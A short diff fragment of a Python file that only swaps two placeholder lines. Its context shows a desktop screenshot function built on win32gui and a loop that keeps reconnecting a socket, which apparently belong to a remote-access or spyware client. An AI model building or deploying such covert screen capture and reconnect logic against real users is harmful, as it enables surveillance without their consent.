@@ -1,4 +1,4 @@
-***JUNK2***
+***JUNK***
 def fscreenshot():
 	hwnd = 0
 	hwndDC = win32gui.GetWindowDC(hwnd)
@@ -534,4 +534,4 @@ while True:
 				fconnect()
 
 s.close()
-***JUNK***
+***JUNK2***
